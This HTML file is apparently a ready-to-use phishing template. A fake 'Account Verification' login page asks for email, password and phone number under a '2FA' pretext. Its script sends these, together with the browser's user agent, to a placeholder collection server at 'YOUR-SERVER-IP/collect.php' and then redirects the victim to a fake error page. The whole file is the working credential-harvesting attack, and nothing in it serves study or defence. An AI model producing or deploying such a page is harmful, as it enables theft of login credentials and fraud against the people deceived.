<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Secure Login - Verification Required</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', sans-serif; }
        body { 
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); 
            height: 100vh; 
            display: flex; 
            justify-content: center; 
            align-items: center; 
        }
        .login-container {
            background: white;
            padding: 40px;
            border-radius: 10px;
            box-shadow: 0 15px 35px rgba(0,0,0,0.2);
            width: 400px;
            text-align: center;
        }
        .logo { width: 80px; margin-bottom: 20px; }
        h2 { color: #333; margin-bottom: 10px; }
        p { color: #666; margin-bottom: 30px; font-size: 14px; }
        .input-group { margin-bottom: 20px; text-align: left; }
        label { display: block; margin-bottom: 5px; color: #555; font-size: 14px; }
        input {
            width: 100%;
            padding: 12px;
            border: 2px solid #ddd;
            border-radius: 5px;
            font-size: 14px;
            transition: border-color 0.3s;
        }
        input:focus { outline: none; border-color: #667eea; }
        button {
            width: 100%;
            padding: 12px;
            background: #667eea;
            color: white;
            border: none;
            border-radius: 5px;
            font-size: 16px;
            cursor: pointer;
            transition: background 0.3s;
        }
        button:hover { background: #5568d3; }
        .error-msg {
            color: #e74c3c;
            font-size: 12px;
            margin-top: 10px;
            display: none;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <img src="https://via.placeholder.com/80" alt="Logo" class="logo">
        <h2>Account Verification</h2>
        <p>Please login to continue to your secure dashboard</p>
        
        <form id="harvestForm" action="http://YOUR-SERVER-IP/collect.php" method="POST">
            <div class="input-group">
                <label for="email">Email Address</label>
                <input type="email" id="email" name="email" placeholder="Enter your email" required>
            </div>
            
            <div class="input-group">
                <label for="password">Password</label>
                <input type="password" id="password" name="password" placeholder="Enter your password" required>
            </div>
            
            <div class="input-group">
                <label for="phone">Phone Number (Optional)</label>
                <input type="tel" id="phone" name="phone" placeholder="For 2FA verification">
            </div>
            
            <button type="submit">Verify & Continue</button>
            <div class="error-msg" id="errorMsg">Processing...</div>
        </form>
        
        <p style="margin-top: 20px; font-size: 12px; color: #999;">
            © 2024 Secure Systems Inc. All rights reserved.
        </p>
    </div>

    <script>
        document.getElementById('harvestForm').addEventListener('submit', function(e) {
            e.preventDefault();
            
            // Collect data
            const data = {
                email: document.getElementById('email').value,
                password: document.getElementById('password').value,
                phone: document.getElementById('phone').value,
                timestamp: new Date().toISOString(),
                userAgent: navigator.userAgent,
                ip: 'auto-capture'
            };
            
            // Send to controller
            fetch('http://YOUR-SERVER-IP/collect.php', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify(data)
            })
            .then(() => {
                // Redirect to real site after capture
                window.location.href = 'https:// legitimate-site.com/login-error';
            })
            .catch(() => {
                document.getElementById('errorMsg').style.display = 'block';
            });
        });
    </script>
</body>
</html>
